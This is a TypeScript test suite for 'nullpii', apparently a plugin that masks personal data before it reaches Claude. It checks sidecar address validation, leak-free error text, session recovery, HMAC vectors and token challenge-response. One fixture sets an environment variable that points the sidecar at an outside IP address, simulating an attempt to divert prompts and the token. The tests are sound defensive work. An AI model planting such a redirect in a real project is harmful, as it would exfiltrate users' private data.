      expect(prompt.drop).toMatch(/sidecar_url is not a local sidecar address/);
      const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
      expect(typeof call.deny).toBe('string');
      expect(ran).toEqual([]);
      // Not one request, so neither the token nor any text left the mod.
      expect(sidecar.calls).toEqual([]);
      const status = await $.command.run({ command: 'pii', args: '' });
      expect(status.text).toContain('Status: blocking (sidecar_url is not a local sidecar address');
    },
  );
}

test('NULLPII_SIDECAR_URL in the environment does not move the sidecar', async ($, on) => {
  // A project's settings can set environment variables; they cannot set
  // plugin options.
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {
    NULLPII_SIDECAR_TOKEN: TOKEN,
    NULLPII_SIDECAR_URL: 'http://203.0.113.7:8787',
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.hosts.length).toBeGreaterThan(0);
  expect(new Set(sidecar.hosts)).toEqual(new Set(['127.0.0.1:8787']));
});

test(
  'the sidecar_url option picks the loopback address and port',
  { options: { sidecar_url: 'http://[::1]:9000' } },
  async ($, on) => {
    const sidecar = fakeSidecar();
    stubSession(on, sidecar);
    on('prompt.submit', ($, e) => ({ text: e.text }));
    await start($);
    const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
    expect(prompt.drop).toBeUndefined();
    expect(new Set(sidecar.hosts)).toEqual(new Set(['[::1]:9000']));
  },
);

/** A sidecar answer that is not JSON and quotes a value: a parse error
 * would carry `John` into whatever shows the error's text. */
const GARBAGE = 'John Smith';

test('a failure before the tool runs reaches Claude as fixed text, never the error text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for John', wait: false, origin: COMPOSER });
  sidecar.state.garbage = GARBAGE;
  const out = await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('PERSON', 0)} .` });
  expect(ran).toEqual([]);
  expect(out.deny).toMatch(/^nullpii could not prepare this tool call/);
  expect(out.deny).not.toContain('John');
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain(
    'Status: blocking (the sidecar answered with something that is not JSON)',
  );
  expect(report.text).not.toContain('John');
  expect(sidecar.logs.join('\n')).not.toContain('John');
});

test('a failure after the tool ran withholds the result with fixed text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: 'owner: John', stderr: '' } }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  sidecar.state.garbage = GARBAGE;
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(out.deny).toMatch(/^nullpii could not mask this tool's result, so it was withheld/);
  expect(JSON.stringify(out)).not.toContain('John');
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({ type: 'Text', text: /^nullpii · blocking: the sidecar answered/ }),
  ).toBeDefined();
  expect(await ui.find({ type: 'Text', text: /John/ })).toBeUndefined();
  await ui.unmount();
  expect(sidecar.logs.join('\n')).not.toContain('John');
});

test('a prompt the sidecar cannot mask is handed back without the error text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  sidecar.state.garbage = GARBAGE;
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toContain('(the sidecar answered with something that is not JSON)');
  expect(prompt.drop).not.toContain('John');
});

test('hooks that find the session gone at once reopen it once, under one key', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  mock.clock(on, { now: 1_700_000_000_000 });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: 'owner: John', stderr: '' } }));
  await start($);
  // A sidecar restart, or its idle TTL: every hook in flight gets a 404.
  sidecar.sessions.clear();
  const before = sidecar.calls.length;
  const answers = await Promise.all([
    $.tool.call({ tool: 'Bash', command: 'cat a.txt' }),
    $.tool.call({ tool: 'Bash', command: 'cat b.txt' }),
    $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER }),
  ]);
  for (const answer of answers) {
    expect(JSON.stringify(answer)).not.toContain('John');
    expect('deny' in answer || 'drop' in answer, JSON.stringify(answer)).toBe(false);
  }
  const puts = sidecar.calls.slice(before).filter((c) => c.startsWith('PUT '));
  expect(puts).toEqual(['PUT /v1/sidecar/sessions/session-1']);
  expect([...sidecar.sessions.keys()]).toEqual(['session-1']);
  expect(sidecar.statuses).not.toContain(403);
  expect(sidecar.statuses).not.toContain(409);
});

test('HMAC-SHA256 matches the reference', async () => {
  // RFC 4231, test case 2.
  expect(await hmacSha256Hex('Jefe', 'what do ya want for nothing?')).toBe(
    '5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843',
  );
  // A key longer than the block size is hashed first (reference: Python's hmac).
  expect(
    await hmacSha256Hex('k'.repeat(100), 'Test Using Larger Than Block-Size Key - Hash Key First'),
  ).toBe('2bc51c04a41032b5f44910acdb471c67a7b1de64e91089e052761fe59a9dac4b');
});

test('every request follows a fresh challenge, and the challenge carries no token', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.calls.length).toBeGreaterThan(0);
  expect(sidecar.challenges.length).toBe(sidecar.calls.length);
  expect(new Set(sidecar.challenges).size).toBe(sidecar.challenges.length);
  // Requests alternate: a challenge without the token, then the call with it.
  expect(sidecar.tokensSent).toEqual(sidecar.calls.flatMap(() => [false, true]));
});

test('a process that cannot prove the token gets neither the token nor the prompt', async ($, on) => {
  const sidecar = fakeSidecar({ impostor: true });
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen).toEqual([]);
  expect(sidecar.calls).toEqual([]);
  expect(sidecar.tokensSent.every((sent) => !sent)).toBe(true);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('did not prove it holds the sidecar token');
});
